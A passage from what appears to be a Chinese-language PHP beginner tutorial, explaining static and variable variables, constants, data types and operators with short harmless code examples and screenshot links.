class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token punctuation">;</span>  <span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/30/aU5BTrkAH7DCxcm.png" alt="phpvar-7.png"></p><p>注：然后，每当函数被调用时，这个变量所存储的信息都是函数最后一次被调用时所包含的信息。该变量仍然是函数的局部变量。</p><h3 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h3><hr><p>可变变量就是，一个变量的变量名可以动态的设置和使用。一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 普通变量</span>$<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'world'</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 可变变量</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$hello</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"$a ${$a}"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"$a $hello"</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/30/Ud46wLCSoaiRfQg.png" alt="phpvar-8.png"></p><p>要将可变变量用于数组，必须解决一个模棱两可的问题。这就是当写下 <code>$$a[1]</code> 时，解析器需要知道是想要 <code>$a[1]</code> 作为一个变量呢，还是想要 <code>$$a</code> 作为一个变量并取出该变量中索引为 <code>[1]</code> 的值。解决此问题的语法是，对第一种情况用 <code>${$a[1]}</code>，对第二种情况用 <code>${$a}[1]</code>。</p><h2 id="PHP-常量"><a href="#PHP-常量" class="headerlink" title="PHP 常量"></a>PHP 常量</h2><h3 id="常量特点"><a href="#常量特点" class="headerlink" title="常量特点"></a>常量特点</h3><hr><ul><li>常量是单个值的标识符（名称）。在脚本中无法改变该值。</li><li>有效的常量名以字符或下划线开头（常量名称前面没有 $ 符号）。</li><li>与变量不同，常量贯穿整个脚本是自动全局的。</li></ul><h3 id="设置-PHP-常量"><a href="#设置-PHP-常量" class="headerlink" title="设置 PHP 常量"></a>设置 PHP 常量</h3><hr><p>使用 define() 函数定义常量，它使用三个参数：</p><ul><li>首个参数定义常量的名称</li><li>第二个参数定义常量的值</li><li>可选的第三个参数规定常量名是否对大小写不敏感。默认是 false。</li></ul><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><hr><ul><li>对大小写敏感</li></ul><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"GREETING"</span><span class="token punctuation">,</span> <span class="token string">"Welcome to W3School.com.cn!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">GREETING</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/03/AVoKfpeSkxTb7Fr.png" alt="php-var1.png"></p><ul><li>对大小写不敏感</li></ul><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"GREETING"</span><span class="token punctuation">,</span> <span class="token string">"Welcome to W3School.com.cn!"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> greeting<span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/03/IcVe3jnh2AEJvQy.png" alt="php-var2.png"></p><ul><li>常量是全局的</li></ul><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"GREETING"</span><span class="token punctuation">,</span> <span class="token string">"Welcome to W3School.com.cn!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token constant">GREETING</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/03/6jJGuD4OXWYh57i.png" alt="php-var3.png"></p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="布尔型（Boolean）"><a href="#布尔型（Boolean）" class="headerlink" title="布尔型（Boolean）"></a>布尔型（Boolean）</h3><p>布尔类型只有两个值 true 或 false，即真与假的概念。两个值都不区分大小写，常用于条件测试。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span><span class="token variable">$y</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/03/RBUnxtZQDszi1Ym.png" alt="php-boolean.png"></p><h3 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h3><p>整数是没有小数的数字。</p><p><strong>整数规则：</strong></p><ul><li>整数必须有至少一个数字（0-9）</li><li>整数不能包含逗号或空格</li><li>整数不能有小数点</li><li>整数正负均可</li><li>可以用三种格式规定整数：十进制、十六进制（前缀是 0x）、八进制（前缀是 0）或二进制（前缀是 0b）</li></ul><p>注：二进制表达的 integer 自 PHP 5.4.0 起可用。</p><p><strong>示例：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">5985</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span> <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">345</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 负数</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span> <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0x8C</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 十六进制数</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">047</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 八进制数</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">=</span> 0b11111111<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 二进制数</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/03/rjBqGpTgf1AQREs.png" alt="php-int.png"></p><h3 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h3><p>浮点数是有小数点或指数形式的数字。</p><p><strong>示例:</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">10.365</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span> <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">2.4e3</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span> <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">8E-5</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/03/UPszSkMHQJ2L1FX.png" alt="php-float.png"></p><h3 id="字符串型"><a href="#字符串型" class="headerlink" title="字符串型"></a>字符串型</h3><p>字符串是字符序列，比如 “Hello world!”。字符串可以是引号内的任何文本,可以使用单引号或双引号。</p><p><strong>示例：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token string">"Hello world!"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span> <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token string">'Hello world!'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/03/zLNnQ9sTaf3dcOv.png" alt="php-string.png"></p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>数组在一个变量中存储多个值。</p><p><strong>示例：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$cars</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"Volvo"</span><span class="token punctuation">,</span><span class="token string">"BMW"</span><span class="token punctuation">,</span><span class="token string">"SAAB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$cars</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/03/QKa9npt6HuzD24y.png" alt="php-array.png"></p><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>类：可以理解为类别。例如：人是一类、汽车是一类、电脑是一类。类还包含了属性、方法、对象。</p><ul><li>属性：就是人的特点，肌肉发达、头顶有点秃、WWE超级巨星</li><li>方法：就是人会摔角、唱歌、表演等各种行为。</li><li>对象：就是类里面的一个具体个体。例如：赵喜娜，就是一个具体的对象。</li></ul><p>实例化：即把赵喜娜拉到你面前，让他确实存在。</p><p>在 PHP 中，首先我们必须声明类，然后将该类实例化为对象。</p><p><strong>示例：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//人的成员属性</span>    <span class="token keyword">var</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//人的名字</span>    <span class="token keyword">var</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//人的年龄</span>    <span class="token comment" spellcheck="true">//人的成员 say() 方法</span>    <span class="token keyword">function</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"I am："</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">name</span><span class="token punctuation">.</span><span class="token string">"&lt;br /&gt;"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"我的年龄是："</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">age</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//类定义结束</span><span class="token comment" spellcheck="true">//实例化一个对象</span><span class="token variable">$zxn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//给 $zxn 对象属性赋值</span><span class="token variable">$zxn</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">"赵喜娜"</span><span class="token punctuation">;</span><span class="token variable">$zxn</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">age</span> <span class="token operator">=</span> <span class="token string">'30'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//调用对象中的 say()方法</span><span class="token variable">$zxn</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// $zxn 的数据类型</span><span class="token keyword">echo</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$zxn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/03/8zHMOTQdlNsISGP.png" alt="php-object.png"></p><h3 id="NULL"><a href="#NULL" class="headerlink" title="NULL"></a>NULL</h3><p>特殊的 NULL 值表示一个变量没有值。NULL 数据类型，唯一可能的值就是 NULL 。</p><p>在下列情况下一个变量被认为是 NULL：</p><ul><li>被赋值为 NULL。</li><li>尚未被赋值。</li><li>被 unset()。</li></ul><p><strong>示例：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token string">"Hello world!"</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/03/vVQUJdnWErs5KYM.png" alt="php-null.png"></p><h2 id="PHP-运算符"><a href="#PHP-运算符" class="headerlink" title="PHP 运算符"></a>PHP 运算符</h2><h3 id="PHP-算数运算符"><a href="#PHP-算数运算符" class="headerlink" title="PHP 算数运算符"></a>PHP 算数运算符</h3><hr><table><thead><tr><th>运算符</th><th>名称</th><th>例子</th><th>结果</th></tr></thead><tbody><tr><td>+</td><td>加法</td><td>$x+$y</td><td>$x 与 $y 求和</td></tr><tr><td>-</td><td>减法</td><td>$x-$y</td><td>$x 与 $y 的差数</td></tr><tr><td>*</td><td>乘法</td><td>$x*$y</td><td>$x 与 $y 的乘积</td></tr><tr><td>/</td><td>除法</td><td>$x/$y</td><td>$x 与 $y 的商数</td></tr><tr><td>%</td><td>取余</td><td>$x%$y</td><td>$x 除以 $y 的余数</td></tr></tbody></table><p><strong>示例：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token number">17</span><span class="token punctuation">;</span><span class="token variable">$y</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">+</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 25</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">-</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 9</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">*</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 136</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">/</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 2.125</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">%</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 1</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/04/LVyMdhUsjQOz259.png" alt="phpsf-1.png"></p><h3 id="PHP-赋值运算符"><a href="#PHP-赋值运算符" class="headerlink" title="PHP 赋值运算符"></a>PHP 赋值运算符</h3><hr><p>PHP 赋值运算符用于向变量写值。</p><table><thead><tr><th>赋值</th><th>等同于</th><th>描述</th></tr></thead><tbody><tr><td>x=y</td><td>x=y</td><td>右侧表达式为左侧运算数设置值。</td></tr><tr><td>x += y</td><td>x = x + y</td><td>加</td></tr><tr><td>x -= y</td><td>x = x - y</td><td>减</td></tr><tr><td>x *= y</td><td>x = x * y</td><td>乘</td></tr><tr><td>x /= y</td><td>x = x / y</td><td>除</td></tr><tr><td>x %= y</td><td>x = x % y</td><td>模数</td></tr></tbody></table><p><strong>示例：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$x</span><span class="token operator">=</span><span class="token number">17</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 17</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token variable">$y</span><span class="token operator">=</span><span class="token number">17</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$y</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 25</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token variable">$z</span><span class="token operator">=</span><span class="token number">17</span><span class="token punctuation">;</span><span class="token variable">$z</span> <span class="token operator">-</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$z</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 9</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">17</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">*</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 136</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">17</span><span class="token punctuation">;</span><span class="token variable">$j</span> <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$j</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 2.125</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">=</span><span class="token number">17</span><span class="token punctuation">;</span><span class="token variable">$k</span> <span class="token operator">%</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$k</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 1</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/04/4o5xvqVu3yEjbwY.png" alt="phpsf-2.png"></p><h3 id="PHP-字符串运算符"><a href="#PHP-字符串运算符" class="headerlink" title="PHP 字符串运算符"></a>PHP 字符串运算符</h3><hr><table><thead><tr><th>运算符</th><th>名称</th><th>例子</th><th>结果</th></tr></thead><tbody><tr><td><strong>.</strong></td><td>串接</td><td>$txt1 = “Hello” $txt2 = $txt1 . “ world!”</td><td>现在 $txt2 包含 “Hello world!”</td></tr><tr><td><strong>.=</strong></td><td>串接赋值</td><td>$txt1 = “Hello” $txt1 .= “ world!”</td><td>现在 $txt1 包含 “Hello world!”</td></tr></tbody></table><p><strong>示例：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"Hello"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span> <span class="token punctuation">.</span> <span class="token string">" world!"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 Hello world!</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token string">"Hello"</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">" world!"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 Hello world!</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/04/Ke3IvqzT7PCXQVF.png" alt="phpsf-3.png"></p><h3 id="PHP-递增-递减运算符"><a href="#PHP-递增-递减运算符" class="headerlink" title="PHP 递增/递减运算符"></a>PHP 递增/递减运算符</h3><hr><table><thead><tr><th>运算符</th><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>++$x</td><td>前递增</td><td>$x 加一递增，然后返回 $x</td></tr><tr><td>$x++</td><td>后递增</td><td>返回 $x，然后 $x 加一递增</td></tr><tr><td>–$x</td><td>前递减</td><td>$x 减一递减，然后返回 $x</td></tr><tr><td>$x–</td><td>后递减</td><td>返回 $x，然后 $x 减一递减</td></tr></tbody></table><p><strong>示例：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token number">17</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token operator">++</span><span class="token variable">$x</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 18</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token variable">$y</span><span class="token operator">=</span><span class="token number">17</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$y</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 17</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token variable">$z</span><span class="token operator">=</span><span class="token number">17</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token operator">--</span><span class="token variable">$z</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 16</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">17</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token operator">--</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 17</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/12/04/z9oHyPeruGpmh41.png" alt="phpsf-4.png"></p><h3 id="PHP-比较运算符"><a href="#PHP-比较运算符" class="headerlink" title="PHP 比较运算符"></a>PHP 比较运算符</h3><hr><p>PHP 比较运算符用于比较两个值（数字或字符串）</p><table><thead><tr><th>运算符</th><th>名称</th><th>例子</th><th>结果</th></tr></thead><tbody><tr><td>==</td><td>等于</td><td>$x == $y</td><td>如果 $x 等于 $y，则返回 true。</td></tr><tr><td>===</td><td>全等（完全相同）</td><td>$x === $y</td><td>如果 $x 等于 $y，且它们类型相同，则返回 true。</td></tr><tr><td>!=</td><td>不等于</td><td>$x != $y</td><td>如果 $x 不等于 $y，则返回 true。</td></tr><tr><td>&lt;&gt;</td><td>不等于</td><td>$x &lt;&gt; $y</td><td>如果 $x 不等于 $y，则返回 true。</td></tr><tr><td>!==</td><td>不全等（完全不同）</td><td>$x !== $y</td><td>如果 $x 不等于 $y，或它们类型不相同，则返回 true。</td></tr><tr><td>&gt;</td><td>大于</td><td>$x &gt; $y</td><td>如果 $x 大于 $y，则返回 true。</td></tr><tr><td>&lt;</td><td>小于</td><td>$x &lt; $y</td><td>如果 $x 小于 $y，则返回 true。</td></tr><tr><td>&gt;=</td><td>大于或等于</td><td>$x &gt;= $y</td><td>如果 $x 大于或者等于 $y，则返回 true.</td></tr><tr><td>&lt;=</td><td>小于或等于</td><td>$x &lt;= $y</td><td>如果 $x 小于或者等于 $y，则返回 true。</td></tr></tbody></table><p><strong>示例：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token number">17</span><span class="token punctuation">;</span> <span class="token variable">$y</span><span class="token operator">=</span><span class="token string">"17"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">==</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token 